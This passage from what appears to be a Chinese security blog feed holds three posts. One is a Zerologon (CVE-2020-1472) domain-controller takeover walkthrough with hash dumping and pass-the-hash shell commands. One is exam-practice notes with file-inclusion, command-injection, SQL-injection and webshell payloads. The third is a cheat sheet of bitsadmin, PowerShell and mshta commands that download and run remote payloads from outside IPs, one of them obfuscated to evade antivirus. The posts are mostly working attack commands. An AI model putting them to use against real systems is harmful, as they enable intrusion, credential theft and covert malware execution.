<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127114005936.png" alt="image-20210127114005936"></p>
<p>这里先用cve-2020-1472-exploit.py置空域控保存在AD中的密码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains python3 cve-2020-1472-exploit.py OWA 192.168.52.138</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127114042552.png" alt="image-20210127114042552"></p>
<p>查看域内用户hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains python3 secretsdump.py god.org&#x2F;OWA\$@192.168.52.138 -just-dc -no-pass</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127114555661.png" alt="image-20210127114555661"></p>
<p>通过wmiexec获取到Shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains python3 wmiexec.py god.org&#x2F;administrator@192.168.52.138 -hashes aad3b435b51404eeaad3b435b51404ee:3f589ddca9ecc4534635e8d432b5c541</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127114814615.png" alt="image-20210127114814615"></p>
<p>接下来就是恢复hash了，命令如下</p>
<p>先备份注册表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br><span class="line">get system.save</span><br><span class="line">get sam.save</span><br><span class="line">get security.save</span><br><span class="line">del &#x2F;f system.save</span><br><span class="line">del &#x2F;f sam.save</span><br><span class="line">del &#x2F;f security.save</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127115248808.png" alt="image-20210127115248808"></p>
<p>退出后可以看到多出三个文件</p>
<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127115405538.png" alt="image-20210127115405538"></p>
<p>使用secretsdump解析保存在本地的nt hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127115532747.png" alt="image-20210127115532747"></p>
<p>恢复原hash，这一步比较久</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains python3 reinstall_original_pw.py OWA 192.168.52.138 8e3ee83b233ce68699a27b6aa9c196dd</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127120102589.png" alt="image-20210127120102589"></p>
<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127120119842.png" alt="image-20210127120119842"></p>
<p>此时想再查看域内用户hash就会失败了</p>
<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127120322059.png" alt="image-20210127120322059"></p>
<p>但是因为之前拿到了administrator的hash，可以再用wmiexec获得shell。</p>
<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127120520658.png" alt="image-20210127120520658"></p>
<p>回顾一个整个过程，利用1472漏洞把域控保存在AD中的密码置空，置空后用secretsdump.py的-no-pass获取域控administrator的hash，再用wmiexec.py和admin的hash登录到域控获得一个shell，通过shell获取本地保存的原hash key，最后通过获取的hash key恢复置空的域控密码，过程中得到的admin的hash仍然可以用于登录域控。</p>
<p>争议：恢复原密码所用到的hash，看文章也有说是$MACHINE.ACC:plain_password_hex中的值</p>
<p>参考：</p>
<p><a href="https://www.cnblogs.com/goabout2/p/13676527.html">https://www.cnblogs.com/goabout2/p/13676527.html</a></p>
<p><a href="https://www.cnblogs.com/sup3rman/p/13680262.html">https://www.cnblogs.com/sup3rman/p/13680262.html</a></p>
<p><a href="https://www.cnblogs.com/Mikasa-Ackerman/p/CVE20201472.html">https://www.cnblogs.com/Mikasa-Ackerman/p/CVE20201472.html</a></p>
]]></content>
      <tags>
        <tag>漏洞复现</tag>
        <tag>cve-2020-1472</tag>
        <tag>提权</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>免杀&amp;去黑窗</title>
    <url>/2021/11/14/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/</url>
    <content><![CDATA[]]></content>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>pts学习</title>
    <url>/2021/12/15/pts%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">各种方式多尝试</span><br><span class="line">多看源码</span><br><span class="line">多看robots文件</span><br><span class="line">多记命令</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1-key1</span><br><span class="line">2-key2</span><br><span class="line">3-key3</span><br><span class="line">4----wireshark</span><br><span class="line">5----3个key</span><br><span class="line">6----3个key</span><br><span class="line"></span><br><span class="line">5-10 题  key</span><br><span class="line">key pte&#x2F;pts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pte   cat ls  管道符   </span><br><span class="line">pts   管道符 直接过滤掉</span><br><span class="line"></span><br><span class="line">vmware   docker</span><br><span class="line"></span><br><span class="line">带上自己的电脑和身份证</span><br><span class="line"></span><br><span class="line">获取KEY值之后需要粘到另一个地方----------粘的对不对，尽力不要手动输入</span><br><span class="line"></span><br><span class="line">PTE考察文件上传  3个过滤条件</span><br><span class="line">PTS              5-4个过滤条件</span><br><span class="line">redis未授权访问+sshkey密钥替换（注意端口    6379-）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">平时练习的时候--题目名字一样---题目内容是不一样的，换个过滤条件就是一个新题</span><br><span class="line">PTE  2次考试机会   PTE 2500元</span><br><span class="line">PTS  3次考试机会   PTS 4000元</span><br></pre></td></tr></table></figure>





<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="12-15"><a href="#12-15" class="headerlink" title="12.15"></a>12.15</h3><p>提示在根目录下key.php中</p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215172129097.png" alt="image-20211215172129097"></p>
<p>访问一下key.php是200，源码无其他内容</p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215172317468.png" alt="image-20211215172317468"></p>
<p>点击进入答题，很明显在file参数</p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215172425061.png" alt="image-20211215172425061"></p>
<p>还是要访问view.html看下，源码未发现其他内容</p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215172637814.png" alt="image-20211215172637814"></p>
<p>利用伪协议读取base64加密的key.php</p>
<p><a href="http://49.232.193.10:83/vulnerabilities/fu1.php?file=php://filter/read=convert.base64-encode/resource=../key.php">http://49.232.193.10:83/vulnerabilities/fu1.php?file=php://filter/read=convert.base64-encode/resource=../key.php</a></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215172817745.png" alt="image-20211215172817745"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215173133049.png" alt="image-20211215173133049"></p>
<h3 id="12-16"><a href="#12-16" class="headerlink" title="12.16"></a>12.16</h3><p>会自动添加txt后缀</p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235302830.png" alt="image-20211216235302830"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235314262.png" alt="image-20211216235314262"></p>
<p>使用远程包含，考试的时候无法连接外网，只能本地起个http服务</p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235529296.png" alt="image-20211216235529296"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;150.158.27.164:83&#x2F;start&#x2F;index.php?page&#x3D;data:text&#x2F;plain,&lt;?php system(&quot;cat ..&#x2F;key.php&quot;)?&gt;?</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217000525050.png" alt="image-20211217000525050"></p>
<h3 id="12-17"><a href="#12-17" class="headerlink" title="12.17"></a>12.17</h3><p>伪协议双写</p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217171116984.png" alt="image-20211217171116984"></p>
<h3 id="12-17-1"><a href="#12-17-1" class="headerlink" title="12.17"></a>12.17</h3><p>直接读</p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172232781.png" alt="image-20211217172232781"></p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="12-15-1"><a href="#12-15-1" class="headerlink" title="12.15"></a>12.15</h3><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215210650348.png" alt="image-20211215210650348"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215210730452.png" alt="image-20211215210730452"></p>
<p>屏蔽了cat\tac\less\tail\tailf\more\nl\head命令，用单引号绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1|c&#39;a&#39;t ..&#x2F;key.*</span><br><span class="line">127.0.0.1|c&#39;a&#39;t ..&#x2F;key*</span><br><span class="line">127.0.0.1|c&#39;a&#39;t ..&#x2F;key.p&#39;h&#39;p</span><br><span class="line">127.0.0.1|c&#39;a&#39;t &#x2F;var&#x2F;www&#x2F;html&#x2F;key*</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215211022077.png" alt="image-20211215211022077"></p>
<h3 id="12-17-2"><a href="#12-17-2" class="headerlink" title="12.17"></a>12.17</h3><p>就那样</p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172400840.png" alt="image-20211217172400840"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172418591.png" alt="image-20211217172418591"></p>
<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="12-15-2"><a href="#12-15-2" class="headerlink" title="12.15"></a>12.15</h3><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215211305385.png" alt="image-20211215211305385"></p>
<p>寻找返回码200的</p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215211457942.png" alt="image-20211215211457942"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215211516286.png" alt="image-20211215211516286"></p>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="12-14"><a href="#12-14" class="headerlink" title="12.14"></a>12.14</h3><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215211620111.png" alt="image-20211215211620111"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    header(&quot;Content-type:text&#x2F;html;charset&#x3D;utf-8&quot;); </span><br><span class="line">    &#x2F;*</span><br><span class="line">    Hint:</span><br><span class="line">    get the shell find the key；）\n&quot;;</span><br><span class="line">    *&#x2F;</span><br><span class="line">    $sandbox &#x3D; &#39;&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;htdocs&#x2F;sandbox&#x2F;&#39; . md5(&quot;cisp-pts&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);	&#x2F;&#x2F;拼接出来一个目录，&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;htdocs&#x2F;sandbox&#x2F;[cisp-pts27.18.46.118]的md5&#x2F;</span><br><span class="line">    @mkdir($sandbox,0777,true);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    echo strlen($_GET[&#39;cmd&#39;]);</span><br><span class="line">    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;&#x3D; 30) &#123;	&#x2F;&#x2F;如果cmd长度小于30就执行cmd命令，用ecoho分步写马到txt，写到txt是为了方便检查，最后mv成php即可。</span><br><span class="line">        @exec($_GET[&#39;cmd&#39;]);</span><br><span class="line">    &#125; else if (isset($_GET[&#39;reset&#39;])) &#123;</span><br><span class="line">        @exec(&#39;&#x2F;bin&#x2F;rm -rf &#39; . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">echo &quot;&lt;br &#x2F;&gt; IP : &#123;$_SERVER[&#39;REMOTE_ADDR&#39;]&#125;&quot;;</span><br></pre></td></tr></table></figure>

<p>路径/usr/local/apache2/htdocs/sandbox/76d99222ba0ed30738b2490dc59580a5/，注意计算md5时echo用-n，即结尾不要回车符，不然就计算的是[cisp-pts27.18.46.118回车符]的md5，不一样了。</p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215212429380.png" alt="image-20211215212429380"></p>
<p>验证路径，403证明存在</p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215212628060.png" alt="image-20211215212628060"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215212647613.png" alt="image-20211215212647613"></p>
<p>尝试执行个命令通过echo到静态文件看结果</p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215213209377.png" alt="image-20211215213209377"></p>
<p>分步写马</p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215213332252.png" alt="image-20211215213332252"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215213417163.png" alt="image-20211215213417163"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215213456376.png" alt="image-20211215213456376"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215213542399.png" alt="image-20211215213542399"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215213614591.png" alt="image-20211215213614591"></p>
<p>最后mv成一个php即可</p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215213957099.png" alt="image-20211215213957099"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215213816292.png" alt="image-20211215213816292"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215214148169.png" alt="image-20211215214148169"></p>
<h3 id="12-16-1"><a href="#12-16-1" class="headerlink" title="12.16"></a>12.16</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;key4.php&quot;;</span><br><span class="line">$PTE &#x3D; &quot;CISP-PTE&quot;;</span><br><span class="line">$str &#x3D; $_GET[&#39;str&#39;];</span><br><span class="line">if (unserialize($str) &#x3D;&#x3D;&#x3D; &quot;$PTE&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;$key4&quot;;</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__); </span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235642320.png" alt="image-20211216235642320"></p>
<p>这种反序列化不需要class名和属性名，只需要属性值即可</p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235916385.png" alt="image-20211216235916385"></p>
<h3 id="12-17-3"><a href="#12-17-3" class="headerlink" title="12.17"></a>12.17</h3><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217171246145.png" alt="image-20211217171246145"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;key4.php&quot;;</span><br><span class="line">$a&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">eval(&quot;\$o&#x3D;strtolower(\&quot;$a\&quot;);&quot;);</span><br><span class="line">echo $o;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure>

<p>网上查的，没理解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;150.158.27.164:1084&#x2F;start&#x2F;vul.php?a&#x3D;$&#123;system(&quot;cat key4.php&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217171332547.png" alt="image-20211217171332547"></p>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="12-16-2"><a href="#12-16-2" class="headerlink" title="12.16"></a>12.16</h3><p>过滤了注释符</p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216231442543.png" alt="image-20211216231442543"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216231500469.png" alt="image-20211216231500469"></p>
<p>绕过方式-#-就变成了–</p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216232120351.png" alt="image-20211216232120351"></p>
<p>文章列表效果</p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216232144069.png" alt="image-20211216232144069"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test&#39;,database(),&#39;cc&#39;)-#- +         &#x2F;&#x2F;cc是对应的用户名</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216232333273.png" alt="image-20211216232333273"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216232349579.png" alt="image-20211216232349579"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zz&#39;,(select group_concat(schema_name) from information_schema.schemata),&#39;cc&#39;)-#- + &#x2F;&#x2F;查询所有库名</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216233039048.png" alt="image-20211216233039048"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">z2&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;2web&quot;),&#39;cc&#39;)-#- +</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216233706223.png" alt="image-20211216233706223"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216233721138.png" alt="image-20211216233721138"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">z3&#39;,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users1&quot;),&#39;cc&#39;)-#- +</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216234348598.png" alt="image-20211216234348598"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216234401233.png" alt="image-20211216234401233"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">z4&#39;,(select concat(username,password) from users1 limit 0,1),&#39;cc&#39;)-#- +</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216234533676.png" alt="image-20211216234533676"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216234545499.png" alt="image-20211216234545499"></p>
<h3 id="12-17-4"><a href="#12-17-4" class="headerlink" title="12.17"></a>12.17</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">过滤了空格，尝试用&#x2F;**&#x2F;,0x0a,0x0b,0x0c,0x0d,()绕过，发现0x0b绕过</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217170508907.png" alt="image-20211217170508907"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217170545321.png" alt="image-20211217170545321"></p>
<h3 id="12-17-5"><a href="#12-17-5" class="headerlink" title="12.17"></a>12.17</h3><p>真的难，id是base64加密，这很容易发现，关键是不知道哪些字符是被过滤的，下图显示的是不加密的数据。</p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172709310.png" alt="image-20211217172709310"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172734526.png" alt="image-20211217172734526"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172758818.png" alt="image-20211217172758818"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172826891.png" alt="image-20211217172826891"></p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="12-16-3"><a href="#12-16-3" class="headerlink" title="12.16"></a>12.16</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">后缀名		&#x2F;&#x2F;大小写，php345,00截断，htaccess,.user.ini</span><br><span class="line">content-type	</span><br><span class="line">文件头		&#x2F;&#x2F;GIF89a</span><br><span class="line">文件内容关键字检查		&#x2F;&#x2F; &lt;?php $_REQUEST[1]($_REQUEST[2]); ?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235028920.png" alt="image-20211216235028920"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235040145.png" alt="image-20211216235040145"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235114127.png" alt="image-20211216235114127"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235137544.png" alt="image-20211216235137544"></p>
<h3 id="12-17-6"><a href="#12-17-6" class="headerlink" title="12.17"></a>12.17</h3><p>未发现新点</p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217170821160.png" alt="image-20211217170821160"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217170841548.png" alt="image-20211217170841548"></p>
<h3 id="12-17-7"><a href="#12-17-7" class="headerlink" title="12.17"></a>12.17</h3><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217171556631.png" alt="image-20211217171556631"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$filename &#x3D; $files[&quot;name&quot;];</span><br><span class="line">$randnum &#x3D; rand(1, 99999);</span><br><span class="line">$fullpath &#x3D; &#39;&#x2F;&#39; . md5($filename.$randnum).&quot;.&quot;.substr($filename,strripos($filename,&#39;.&#39;) + 1);	&#x2F;&#x2F;shell名为md5(文件全名+rand(1,99999)).php,后半段.substr($filename,strripos($filename,&#39;.&#39;) + 1)总是返回后缀名</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217171641792.png" alt="image-20211217171641792"></p>
<p>生成字典</p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217171941519.png" alt="image-20211217171941519"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172000987.png" alt="image-20211217172000987"></p>
<p>爆破</p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172022858.png" alt="image-20211217172022858"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172106460.png" alt="image-20211217172106460"></p>
<h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><h3 id="12-16-4"><a href="#12-16-4" class="headerlink" title="12.16"></a>12.16</h3><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217000009524.png" alt="image-20211217000009524"></p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217000046096.png" alt="image-20211217000046096"></p>
<p>false改true，Username的base64解密是guest，改admin即可</p>
<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217000209761.png" alt="image-20211217000209761"></p>
<h3 id="12-17-8"><a href="#12-17-8" class="headerlink" title="12.17"></a>12.17</h3><p>和12.16一样</p>
]]></content>
      <tags>
        <tag>考证</tag>
      </tags>
  </entry>
  <entry>
    <title>文件下载和执行</title>
    <url>/2021/07/14/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
    <content><![CDATA[<h2 id="bitsadmin-下载，远程执行exe"><a href="#bitsadmin-下载，远程执行exe" class="headerlink" title="bitsadmin(下载，远程执行exe)"></a>bitsadmin(下载，远程执行exe)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">自 windows7 以上版本内置 bitsadmin，它可以在网络不稳定的状态下下载文件，出错会自动重试，在比较复杂的网络环境下，有着不错的性能。</span><br><span class="line">支持的系统版本：Windows vista、Windows 7、Windows 8、Windows 8.1、Windows 10</span><br><span class="line">必须指定路径。</span><br><span class="line">注意：如果用python开放http服务提供下载，可以下载文本文件，但有时候无法下载exe文件。后来是在vps上安装的apache提供的下载服务，可以下载exe并运行。</span><br></pre></td></tr></table></figure>

<p>python开放http服务提供下载exe时可能会报错如下</p>
<p><img src="/../../../../images/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20210715095124436.png" alt="image-20210715095124436"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer myDownLoadJob &#x2F;download &#x2F;priority normal &quot;http:&#x2F;&#x2F;23.91.97.29:997&#x2F;t1st.txt&quot; &quot;d:\abc.jpg&quot;		#下载文件到指定目录</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20210714172613949.png" alt="image-20210714172613949"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer d90f http:&#x2F;&#x2F;23.91.97.29&#x2F;dt&#x2F;calc.exe %APPDATA%\d90f.exe&amp;%APPDATA%\d90f.exe&amp;del %APPDATA%\d90f.exe			#下载exe并运行</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20210715095722393.png" alt="image-20210715095722393"></p>
<h2 id="powershell-下载，远程执行ps1）"><a href="#powershell-下载，远程执行ps1）" class="headerlink" title="powershell(下载，远程执行ps1）"></a>powershell(下载，远程执行ps1）</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">要求win7及以上</span><br><span class="line">powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile(&#39;http:&#x2F;&#x2F;23.91.97.29:998&#x2F;t1st.txt&#39;,&#39;C:\Users\test1\Desktop\1.jpg&#39;)			#下载文件文件到指定目录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile(&#39;http:&#x2F;&#x2F;23.91.97.29:998&#x2F;t1st.txt&#39;,&#39;1.jpg&#39;)			#下载到当前目录</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell set-alias -name kaspersky -value Invoke-Expression;&quot;$a1&#x3D;&#39;kaspersky ((new-object net.webclient).downl&#39;;$a2&#x3D;&#39;oadstring(&#39;&#39;http:&#x2F;&#x2F;47.52.31.161:8080&#x2F;sh1&#39;&#39;))&#39;;$a3&#x3D;$a1,$a2;kaspersky(-join $a3)&quot;			#下载并运行ps1文件</span><br></pre></td></tr></table></figure>





<h2 id="mshta-远程执行hta"><a href="#mshta-远程执行hta" class="headerlink" title="mshta(远程执行hta)"></a>mshta(远程执行hta)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用于执行hta文件</span><br><span class="line">生成hta马，然后mshta http:&#x2F;&#x2F;23.91.97.29:88&#x2F;evil.hta</span><br><span class="line"></span><br><span class="line">mshta vbscript:CreateObject(&quot;Wscript.Shell&quot;).Run(&quot;calc.exe&quot;,0,true)(window.close)		#调用vbs执行命令</span><br><span class="line"></span><br><span class="line">mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h&#x3D;new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;,0,true);try&#123;h.Send();b&#x3D;h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd &#x2F;c taskkill &#x2F;f &#x2F;im mshta.exe&quot;,0,true);&#125;</span><br><span class="line">			#调用JAVASCRIPT执行命令</span><br></pre></td></tr></table></figure>







